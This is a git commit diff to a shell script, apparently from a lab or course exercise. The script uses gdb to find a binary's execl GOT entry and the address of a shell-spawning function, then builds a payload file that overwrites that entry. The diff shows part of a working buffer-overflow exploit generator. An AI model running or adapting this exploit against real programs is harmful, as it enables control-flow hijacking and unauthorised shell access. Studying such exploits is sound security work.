052d9e9d56d1feef2870c06f95a6a4f0998da394
soniloi <niloinso@tcd.ie>
2015-03-08 11:04:09 +0000

    Changed overflow to use -ex command rather than reading from file

--- overflow/single/overflow.sh
+++ overflow/single/overflow.sh
@@ -30,14 +30,12 @@ echo "Offset to $execfn@got.plt: $distance"
 let distance=$(($distance / 8))
 
 # Find table entry of execl
-echo -n "x/2gx 0x$execaddrline" > comms1
-execloc=(`gdb $binname < comms1 | $grepnc "<$execfn@got\.plt>"`)
-execloc=(`echo ${execloc[3]} | cut -f2 -d "x"`)
+execloc=(`gdb $binname -ex "x/2gx 0x$execaddrline" -ex "quit" | $grepnc "<$execfn@got\.plt>"`)
+execloc=(`echo ${execloc[2]} | cut -f2 -d "x"`)
 echo "Location of $execfn@got.plt: 0x$execloc"
 
 # Find address of shell-spawning function
-echo -n "p $spawnfn" > comms2
-spawnaddrline=(`gdb $binname < comms2 | $grepnc "0x[0-9a-fA-F]\{6,8\}"`)
+spawnaddrline=(`gdb $binname -ex "p $spawnfn" -ex "quit" | $grepnc "0x[0-9a-fA-F]\{6,8\}"`)
 salindex=0
 for i in "${!spawnaddrline[@]}"; do
 	if [[ ${spawnaddrline[$i]} == "<$spawnfn>" ]]; then
@@ -59,7 +57,3 @@ for i in {0..3}; do echo -n -e \\x00 >> $dat2; done
 for i in $(seq 1 "$distance"); do
 	for ((i=7;i>=0;i--)); do echo -n -e \\x${execloc:2*i:2} >> $dat2; done
 done;
-
-# Clean up
-if [ -f comms1 ]; then rm comms1; fi
-if [ -f comms2 ]; then rm comms2; fi
